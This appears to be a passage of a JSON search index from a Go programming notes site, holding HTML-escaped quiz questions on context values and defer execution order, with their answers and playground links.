(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;context\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWithValue\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;foo\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTODO\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eValue\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;foo\u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. -6\u003c/li\u003e\n\u003cli\u003eB. 0\u003c/li\u003e\n\u003cli\u003eC. \u003ccode\u003e\u0026lt;nil\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eD: panic\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/NY8BWaciqad\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eC\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003econtext1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;encoding/json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;context\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eMarshal\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWithValue\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBackground\u003c/span\u003e(), \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;b\u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/CWdDXkvRExT\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e{\"Context\":{}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Context"},{"categories":null,"contents":" defer package main import ( \u0026#34;fmt\u0026#34; ) func main() { defer_call() } func defer_call() { defer func() { fmt.Println(\u0026#34;1\u0026#34;) }() defer func() { fmt.Println(\u0026#34;2\u0026#34;) }() defer func() { fmt.Println(\u0026#34;3\u0026#34;) }() panic(\u0026#34;4\u0026#34;) } Answer Try it 3 2 1 panic: 4 defer1 package main import ( \u0026#34;fmt\u0026#34; ) type Person struct { age int } func main() { person := \u0026amp;Person{28} defer fmt.Println(person.age) defer func(p *Person) { fmt.Println(p.age) }(person) defer func() { fmt.Println(person.age) }() person.age = 29 } Answer Try it 29 29 28 defer2 package main import ( \u0026#34;fmt\u0026#34; ) type Person struct { age int } func main() { person := \u0026amp;Person{28} defer fmt.Println(person.age) defer func(p *Person) { fmt.Println(p.age) }(person) defer func() { fmt.Println(person.age) }() person = \u0026amp;Person{29} } Answer Try it 29 28 28 defer3 package main import ( \u0026#34;fmt\u0026#34; ) var a bool = true func main() { defer func() { fmt.Println(\u0026#34;1\u0026#34;) }() if a == true { fmt.Println(\u0026#34;2\u0026#34;) return } defer func() { fmt.Println(\u0026#34;3\u0026#34;) }() } Answer Try it 2 1 defer4 package main import \u0026#34;fmt\u0026#34; type temp struct{} func (t *temp) Add(elem int) *temp { fmt.Print(elem) return \u0026amp;temp{} } func main() { tt := \u0026amp;temp{} defer tt.Add(1).Add(2) tt.Add(3) } A. 132 B. 123 C. 312 D. 321 Answer Try it A ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/defer/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edefer_call\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edefer_call\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() { \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e) }()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() { \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e) }()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() { \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e) }()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    panic(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;4\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/-bTDzXAjgYn\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e3\n2\n1\npanic: 4\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e = \u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/JChQfww_8GK\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e29\n29\n28\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ep\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eage\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eperson\u003c/span\u003e = \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ePerson\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/blqcBt9nVrk\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e29\n28\n28\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan 